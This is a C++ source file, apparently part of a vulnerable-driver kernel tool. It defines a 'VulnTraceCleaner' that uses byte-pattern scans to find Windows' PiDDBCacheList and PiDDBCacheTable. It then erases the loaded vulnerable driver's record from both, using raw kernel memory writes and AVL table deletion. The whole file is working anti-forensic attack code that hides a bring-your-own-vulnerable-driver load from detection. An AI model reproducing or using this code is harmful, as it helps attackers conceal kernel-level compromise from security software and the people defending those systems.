#include "vuln_trace_cleaner.hpp"

#include <kernel/k32_context.hpp>
#include <kernel/k32_parser.hpp>

#include <utils/cmn_utils.hpp>

#include <ntdll.hpp>
#include <spdlog/spdlog.h>

VulnTraceCleaner::VulnTraceCleaner(std::shared_ptr<K32Context> k32ctx, std::shared_ptr<K32Module> k32Module)
    : k32ctx(std::move(k32ctx))
    , k32ModuleParser(std::make_unique<K32ModuleParser>(this->k32ctx->GetDriver(), std::move(k32Module)))
{
}

bool VulnTraceCleaner::Cleanup() const
{
    if (!CleanupPiDDBCacheList()) {
        spdlog::error("Failed to cleanup vulnerable driver from PiDDBCacheList");
        return false;
    }

    if (!CleanupPiDDBCacheTable()) {
        spdlog::error("Failed to cleanup vulnerable driver from PiDDBCacheTable");
        return false;
    }

    return true;
}

bool VulnTraceCleaner::CleanupPiDDBCacheList() const
{
    static const auto _PiDDBCacheList = k32ModuleParser->FindAbsoluteAddr(
        "\x48\x8D\x15\x00\x00\x00\x00\x48\x8B\x0D\x00\x00\x00\x00\x00\x00\x00\x74",
        "xxx????xxx???????x", 3, 7);

    if (!_PiDDBCacheList) {
        spdlog::error("_PiDDBCacheList not found");
        return false;
    }

    uintptr_t link = 0;
    if (!k32ctx->GetDriver().ReadMemory(_PiDDBCacheList, &link, sizeof(link))) {
        spdlog::error("Failed to read head of PiDDBCacheList");
        return false;
    }

    while (link != _PiDDBCacheList) {
        PiDDBCacheEntry entry { };
        if (!k32ctx->GetDriver().ReadMemory(link, &entry, sizeof(entry))) {
            spdlog::error("Failed to read entry at 0x{:X}", link);
            return false;
        }

        uintptr_t flink = reinterpret_cast<uintptr_t>(entry.List.Flink);

        if (entry.TimeDateStamp == k32ctx->GetDriver().GetTimeStamp()) {
            uintptr_t blink = reinterpret_cast<uintptr_t>(entry.List.Blink);

            if (!k32ctx->GetDriver().WriteMemory(blink, &flink, sizeof(flink))) {
                spdlog::error("Failed to rewrite node Flink");
                return false;
            }

            if (!k32ctx->GetDriver().WriteMemory(flink + sizeof(uintptr_t), &blink, sizeof(blink))) {
                spdlog::error("Failed to rewrite node Blink");
                return false;
            }

            spdlog::info("Vulnerable driver unlinked from PiDDBCacheList");
        }

        link = flink;
    }

    return true;
}

bool VulnTraceCleaner::CleanupPiDDBCacheTable() const
{
    static const auto _PiDDBCacheTable = k32ModuleParser->FindAbsoluteAddr(
        "\x48\x8D\x0D\x00\x00\x00\x00\x45\x33\xF6\x48\x89\x44\x24",
        "xxx????xxxxxxx", 3, 7);

    if (!_PiDDBCacheTable) {
        spdlog::error("_PiDDBCacheTable not found");
        return false;
    }

    const auto& driver = k32ctx->GetDriver();
    const auto& name = driver.GetName();

    PiDDBCacheEntry compared = { 0 };
    compared.TimeDateStamp = driver.GetTimeStamp();

    std::wstring driverNameW(name.begin(), name.end());
    compared.DriverName.Buffer = driverNameW.data();
    compared.DriverName.Length = (USHORT)(driverNameW.size() * sizeof(wchar_t));
    compared.DriverName.MaximumLength = compared.DriverName.Length;

    const auto entry = k32ctx->RtlLookupElementGenericTableAvl(
        (PRTL_AVL_TABLE)_PiDDBCacheTable, (PVOID)&compared);

    if (!entry) {
        spdlog::error("Entry not found in PiDDBCacheTable");
        return false;
    }

    return k32ctx->RtlDeleteElementGenericTableAvl((PRTL_AVL_TABLE)_PiDDBCacheTable, entry);
}